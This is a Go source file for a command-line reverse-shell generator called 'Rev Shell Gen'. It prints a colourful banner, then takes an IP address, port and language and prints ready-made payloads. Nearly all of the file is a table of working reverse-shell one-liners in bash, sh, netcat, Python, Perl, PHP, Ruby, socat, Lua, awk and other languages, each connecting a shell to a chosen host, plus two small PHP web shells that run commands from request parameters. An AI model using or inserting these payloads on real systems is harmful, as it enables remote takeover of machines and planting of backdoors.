package main

import (
	"fmt"
	"os"
	"strings"
)

func main() {
	// red := "\u001b[31m"        // 红色
	green := "\u001b[32m"      // 绿色
	// yellow := "\u001b[33m"     // 黄色
	// blue := "\u001b[34m"       // 蓝色
	// magenta := "\u001b[35m"    // 品红色
	// cyan := "\u001b[36m"       // 青色
	// white := "\u001b[37m"      // 白色

	brightRed := "\u001b[91m"   // 亮红色
	brightGreen := "\u001b[92m" // 亮绿色
	brightYellow := "\u001b[93m"// 亮黄色
	brightBlue := "\u001b[94m"  // 亮蓝色
	brightMagenta := "\u001b[95m"// 亮品红色
	brightCyan := "\u001b[96m"  // 亮青色
	// brightWhite := "\u001b[97m" // 亮白色

	resett := "\u001b[0m"        // 重置颜色为默认值
	
	var asciiArt = 
brightRed + `_____               _____ _          _ _    _____  ` + "\n" +
brightGreen + `|  __ \             / ____| |        | | |  / ____|` + "\n" +
brightYellow + `| |__) |_____   __ | (___ | |__   ___| | | | |  __  ___ _ __ ` + "\n" +
brightBlue + `|  _  // _ \ \ / /  \___ \| '_ \ / _ \ | | | | |_ |/ _ \ '_ \` + "\n" +
brightCyan + `| | \ \  __/\ V /   ____) | | | |  __/ | | | |__| |  __/ | | |` + "\n" + 
brightMagenta + `|_|  \_\___| \_/   |_____/|_| |_|\___|_|_|  \_____|\___|_| |_|` + "\n" +
"\n                       " + brightRed + "| " + brightCyan + "💻 Author: " + brightMagenta + "Gh0stX "+ brightRed + "|" + " 🍎 " + brightYellow + "Version: " + brightGreen + "1.0" + brightRed + " |\n" + resett

var dictionary = map[string][]string{
	"bash": {
		brightCyan + `------------------------------------------`,
		brightMagenta + `Bash -i:`,
		`bash -i >& /dev/tcp/[IPADDR]/[PORT] 0>&1`,
		`/bin/bash -i >& /dev/tcp/[IPADDR]/[PORT] 0>&1`,
		brightCyan + `------------------------------------------`,
		brightMagenta + `Bash 196:`,
		`0<&196;exec 196<>/dev/tcp/[IPADDR]/[PORT]; bash <&196 >&196 2>&196`,
		`0<&196;exec 196<>/dev/tcp/[IPADDR]/[PORT]; /bin/bash <&196 >&196 2>&196`,
		brightCyan + `------------------------------------------`,
		brightMagenta + `Bash read line:`,
		`exec 5<>/dev/tcp/[IPADDR]/[PORT];cat <&5 | while read line; do $line 2>&5 >&5; done`,
		brightCyan + `------------------------------------------`,
		brightMagenta + `Bash 5:`,
		`bash -i 5<> /dev/tcp/[IPADDR]/[PORT] 0<&5 1>&5 2>&5`,
		`/bin/bash -i 5<> /dev/tcp/[IPADDR]/[PORT] 0<&5 1>&5 2>&5`,
		brightCyan + `------------------------------------------`,
		brightMagenta + `Bash UDP:`,
		`bash -i >& /dev/udp/[IPADDR]/[PORT] 0>&1`,
		`/bin/bash -i >& /dev/udp/[IPADDR]/[PORT] 0>&1`,
	},
	"sh": {
		`sh -i >& /dev/tcp/[IPADDR]/[PORT] 0>&1`,
		`/bin/sh -i >& /dev/tcp/[IPADDR]/[PORT] 0>&1`,
	},
	"ruby": {
		brightCyan + `------------------------------------------`,
		brightMagenta + `Ruby #1:`,
		`ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("[IPADDR]",[PORT]))'`,
		brightCyan + `------------------------------------------`,
		brightMagenta + `Ruby no sh:`,
		`ruby -rsocket -e'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'`,
	},
	"nc": {
		brightCyan + `------------------------------------------`,
		brightMagenta + `nc -e:`,
		`nc [IPADDR] [PORT] -e /bin/bash`,
		brightCyan + `------------------------------------------`,
		brightMagenta + `nc -c:`,
		`nc -c /bin/bash [IPADDR] [PORT]`,
		brightCyan + `------------------------------------------`,
		brightMagenta + `ncat -e:`,
		`ncat [IPADDR] [PORT] -e /bin/bash`,
		brightCyan + `------------------------------------------`,
		brightMagenta + `busybox nc -e:`,
		`busybox nc [IPADDR] [PORT] -e /bin/bash`,
		brightCyan + `------------------------------------------`,
		brightMagenta + `nc mkfifo:`,
		`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc [IPADDR] [PORT] >/tmp/f`,
		brightCyan + `------------------------------------------`,
		brightMagenta + `ncat udp:`,
		`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|ncat -u [IPADDR] [PORT] >/tmp/f`,
	},
	"python": {
		brightCyan + `------------------------------------------`,
		brightMagenta + `Python #1:`,
		`export RHOST="[IPADDR]";export RPORT=[PORT];python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'`,
		brightCyan + `------------------------------------------`,
		brightMagenta + `Python #2:`,
		`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[IPADDR]",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`,
		brightCyan + `------------------------------------------`,
		brightMagenta + `Python3 #1:`,
		`export RHOST="[IPADDR]";export RPORT=[PORT];python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'`,
		brightCyan + `------------------------------------------`,
		brightMagenta + `Python3 #2:`,
		`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[IPADDR]",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`,
		brightCyan + `------------------------------------------`,
		brightMagenta + `Python3 shortest:`,
		`python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("[IPADDR]",[PORT]));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'`,
	},
	"rcat": {
		brightCyan + `------------------------------------------`,
		brightMagenta + `rcat:`,
		`rcat [IPADDR] [PORT] -r /bin/bash`,
	},
	"perl": {
		brightCyan + `------------------------------------------`,
		brightMagenta + `perl:`,
		`perl -e 'use Socket;$i="[IPADDR]";$p=[PORT];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'`,
		brightCyan + `------------------------------------------`,
		brightMagenta + `perl no sh:`,
		`perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`,
	},
	"php": {
		brightCyan + `------------------------------------------`,
		brightMagenta + `PHP cmd 2:`,
		`<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>`,
		brightCyan + `------------------------------------------`,
		brightMagenta + `PHP cmd shell:`,
		"<?=`$_GET[0]`?>",
		brightCyan + `------------------------------------------`,
		brightMagenta + `PHP exec:`,
		`php -r '$sock=fsockopen("[IPADDR]",[PORT]);exec("/bin/bash <&3 >&3 2>&3");'`,
		brightCyan + `------------------------------------------`,
		brightMagenta + `PHP shell_exec:`,
		`php -r '$sock=fsockopen("[IPADDR]",[PORT]);shell_exec("/bin/bash <&3 >&3 2>&3");'`,
		brightCyan + `------------------------------------------`,
		brightMagenta + `PHP system:`,
		`php -r '$sock=fsockopen("[IPADDR]",[PORT]);system("/bin/bash <&3 >&3 2>&3");'`,
		brightCyan + `------------------------------------------`,
		brightMagenta + `PHP passthru:`,
		`php -r '$sock=fsockopen("[IPADDR]",[PORT]);passthru("/bin/bash <&3 >&3 2>&3");'`,
		brightCyan + `------------------------------------------`,
		brightMagenta + "PHP`:",
		`php -r '$sock=fsockopen("[IPADDR]",[PORT]);` + "/bin/bash <&3 >&3 2>&3`;",
		brightCyan + `------------------------------------------`,
		brightMagenta + `PHP popen:`,
		`php -r '$sock=fsockopen("[IPADDR]",[PORT]);popen("/bin/bash <&3 >&3 2>&3", "r");'`,
		brightCyan + `------------------------------------------`,
		brightMagenta + `PHP proc_open:`,
		`php -r '$sock=fsockopen("[IPADDR]",[PORT]);$proc=proc_open("/bin/bash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'`,
	},
	"socat": {
		brightCyan + `------------------------------------------`,
		brightMagenta + `socat #1:`,
		`socat TCP:[IPADDR]:[PORT] EXEC:/bin/bash`,
		brightCyan + `------------------------------------------`,
		brightMagenta + `socat #2(TTY):`,
		`socat TCP:[IPADDR]:[PORT] EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane`,
	},
	"node": {
		brightCyan + `------------------------------------------`,
		brightMagenta + `node.js:`,
		`require('child_process').exec('nc -e /bin/bash [IPADDR] [PORT]')`,
	},
	"telnet": {
		brightCyan + `------------------------------------------`,
		brightMagenta + `telnet:`,
		`TF=$(mktemp -u);mkfifo $TF && telnet [IPADDR] [PORT] 0<$TF | /bin/bash 1>$TF`,
	},
	"zsh": {
		brightCyan + `------------------------------------------`,
		brightMagenta + `zsh:`,
		`zsh -c 'zmodload zsh/net/tcp && ztcp [IPADDR] [PORT] && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'`,
	},
	"lua": {
		brightCyan + `------------------------------------------`,
		brightMagenta + `Lua #1:`,
		`lua -e "require('socket');require('os');t=socket.tcp();t:connect('[IPADDR]','[PORT]');os.execute('/bin/bash -i <&3 >&3 2>&3');"`,
		brightCyan + `------------------------------------------`,
		brightMagenta + `Lua #2:`,
		`lua5.1 -e 'local host, port = "[IPADDR]", [PORT] local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'`,
	},
	"golang": {
		brightCyan + `------------------------------------------`,
		brightMagenta + `Golang:`,
		`echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","[IPADDR]:[PORT]");cmd:=exec.Command("/bin/bash");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go`,
	},
	"vlang": {
		brightCyan + `------------------------------------------`,
		brightMagenta + `Vlang:`,
		`echo 'import os' > /tmp/t.v && echo 'fn main() { os.system("nc -e /bin/bash [IPADDR] [PORT] 0>&1") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v`,
	},
	"awk": {
		brightCyan + `------------------------------------------`,
		brightMagenta + `AWK:`,
		`awk 'BEGIN {s = "/inet/tcp/0/[IPADDR]/[PORT]"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`,
	},
	"crystal": {
		brightCyan + `------------------------------------------`,
		brightMagenta + `Crystal (system):`,
		`crystal eval 'require "process";require "socket";c=Socket.tcp(Socket::Family::INET);c.connect("[IPADDR]",[PORT]);loop{m,l=c.receive;p=Process.new(m.rstrip("\n"),output:Process::Redirect::Pipe,shell:true);c<<p.output.gets_to_end}'`,
	},
	
}

	if len(os.Args) != 4 {
		fmt.Println(asciiArt)
		fmt.Println(brightYellow + "Usage:   \n"+ green + "./revshell [IPADDR] [PORT] [LANGUAGE]\n")
		fmt.Println(brightMagenta + "Example: \n"+ green + "./revshell 192.168.1.1 1234 bash\n")
		fmt.Println(brightCyan + "Supported languages: \n" + green + "bash|sh|nc|ruby|php|python|rcat|perl|socat|node|telnet|zsh|lua|golang|vlang|awk|crystal")
		return
	}

	ipAddr := os.Args[1]
	port := os.Args[2]
	language := os.Args[3]

	if commands, ok := dictionary[language]; ok {
		fmt.Println(asciiArt)
		for _, command := range commands {
			replaced := strings.ReplaceAll(command, "[IPADDR]", ipAddr)
			replaced = strings.ReplaceAll(replaced, "[PORT]", port)
			fmt.Println(green + replaced)
		}
	} else {
		fmt.Println("Language not found in the dictionary.")
	}
}